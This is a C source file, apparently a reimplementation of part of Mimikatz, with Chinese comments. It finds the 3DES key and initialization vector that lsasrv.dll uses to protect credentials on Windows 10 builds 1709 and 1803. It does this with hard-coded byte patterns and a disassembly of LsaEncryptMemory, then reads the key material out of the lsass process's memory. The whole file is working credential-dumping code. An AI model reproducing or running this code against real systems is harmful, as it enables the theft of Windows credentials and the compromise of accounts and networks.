#include "stdafx.h"
#include <Windows.h>
#include "lsasrv.h"
#include "process.h"

static IMAGE_PATTERN lsasrv_h3deskey[] = {
	{0x000a00003fab0135, 0x50245c8944db3345, -4}, //win10x64 1709
	{0x000a000042ee00fe, 0x50245c8944db3345, -4}, //win10x64 1803

	{0, 0, 0}
};

static IMAGE_PATTERN lsasrv_IV[] = {
	{0x000a00003fab0135, 0x7f0ff307e083c28b, -4}, //win10x64 1709
	{0x000a000042ee00fe, 0xc2f65824447f0ff3, -4}, //win10x64 1803
	{0, 0, 0}
};

BOOL FindH3DesKey(IN HANDLE hLsass, OUT PKIWI_HARD_KEY lp3DesKey,
	OUT LPBYTE lpIV, OUT LPDWORD lpcbIV)
{
	/*  Win10 lsasrv.dll, 目前没找到特殊方法，靠传统的硬编码来找
	LsaUnprotectMemory:
	.text:000007FF7D018700                               LsaUnprotectMemory proc near            ; CODE XREF: CredpMarshalCredential(_CANONICAL_CREDENTIAL *,uchar *,ulong *,uchar *)+496p
	.text:000007FF7D018700                                                                       ; CredpWritePinToCsp(_CREDENTIAL_SETS *,_CANONICAL_CREDENTIAL *)+2CDp ...
	.text:000007FF7D018700 45 33 C0                                      xor     r8d, r8d        ; int
	.text:000007FF7D018703 E9 A8 89 FF FF                                jmp     ?LsaEncryptMemory@@YAXPEAEKH@Z ; LsaEncryptMemory(uchar *,ulong,int)
	.text:000007FF7D018703                               LsaUnprotectMemory endp
	LsaEncryptMemory:
	00007FFB15D3E08C 48 85 C9             test        rcx, rcx
	00007FFB15D3E08F 0F 84 A2 00 00 00    je          LsaEncryptMemory + 0ABh(07FFB15D3E137h)
	00007FFB15D3E095 48 83 EC 78          sub         rsp, 78h
	00007FFB15D3E099 48 8B 05 88 86 12 00 mov         rax, qword ptr[__security_cookie(07FFB15E66728h)]
	00007FFB15D3E0A0 48 33 C4             xor         rax, rsp
	00007FFB15D3E0A3 48 89 44 24 68       mov         qword ptr[rsp + 68h], rax
	00007FFB15D3E0A8 4C 8B 15 69 D6 12 00 mov         r10, qword ptr[h3DesKey(07FFB15E6B718h)]
	00007FFB15D3E0AF 45 33 DB             xor         r11d, r11d
	00007FFB15D3E0B2 44 89 5C 24 50       mov         dword ptr[rsp + 50h], r11d
	00007FFB15D3E0B7 85 D2                test        edx, edx
	00007FFB15D3E0B9 74 6B                je          LsaEncryptMemory + 9Ah(07FFB15D3E126h)
	00007FFB15D3E0BB 0F 10 05 3E D6 12 00 movups      xmm0, xmmword ptr[InitializationVector(07FFB15E6B700h)]
	00007FFB15D3E0C2 8B C2                mov         eax, edx
	00007FFB15D3E0C4 83 E0 07 and eax, 7
	00007FFB15D3E0C7 F3 0F 7F 44 24 58    movdqu      xmmword ptr[rsp + 58h], xmm0
	00007FFB15D3E0CD 4C 0F 45 15 3B D6 12 00 cmovne      r10, qword ptr[hAesKey(07FFB15E6B710h)]
	00007FFB15D3E0D5 F7 D8                neg         eax
	*/
	HMODULE hModule = LoadLibraryW(L"lsasrv");
	LPBYTE lpStart = (LPBYTE)hModule;
	LPBYTE lpEnd   = (LPBYTE)GetProcAddress(hModule, "InitializeLsaExtension");

	LPVOID lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN) &lsasrv_h3deskey, lpStart, lpEnd, 0);
	GOTO_MSG_IF(lpPtr == NULL, cleanup, L"Cant find h3deskey pointer, maybe unsupport this version\r\n");

	//从lsass进程读取h3deskey指针
	SIZE_T cbMemoryRead = 0;
	BOOL bRet = ReadProcessMemory(hLsass, lpPtr, &lpPtr, sizeof(LPVOID), &cbMemoryRead);
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
	//读取h3deskey结构，其为一个bcrypt handle
	KIWI_BCRYPT_HANDLE_KEY szBcryptHandleKey;
	bRet = ReadProcessMemory(hLsass, lpPtr, &szBcryptHandleKey, sizeof(szBcryptHandleKey), &cbMemoryRead);
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);

	//MESSAGE(L"h3deskey structure=> Size:%x, Tag:%x, Keyptr:%p\r\n", szBcryptHandleKey.size,
	//		szBcryptHandleKey.tag, szBcryptHandleKey.key);
	//读取bcrypt key, kiwi_bcrypt_key81适用于win10，这里应对不同系统进行“适配”，这里未做
	KIWI_BCRYPT_KEY81 szBcryptKey;
	bRet = ReadProcessMemory(hLsass, szBcryptHandleKey.key, &szBcryptKey, sizeof(szBcryptKey), &cbMemoryRead);
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);

	//输出key
	CopyMemory(lp3DesKey, (LPVOID)&szBcryptKey.hardkey, sizeof(KIWI_HARD_KEY));
	//查找IV
	lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&lsasrv_IV, lpStart, lpEnd, 0);
	//3deskey为8字节，win10使用，这里未作AES（16字节）的适配，故使用8字节
	*lpcbIV = 0x08;
	bRet = ReadProcessMemory(hLsass, lpPtr, lpIV, *lpcbIV, &cbMemoryRead);
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
cleanup:
	FreeLibrary(hModule);
	return bRet;
}

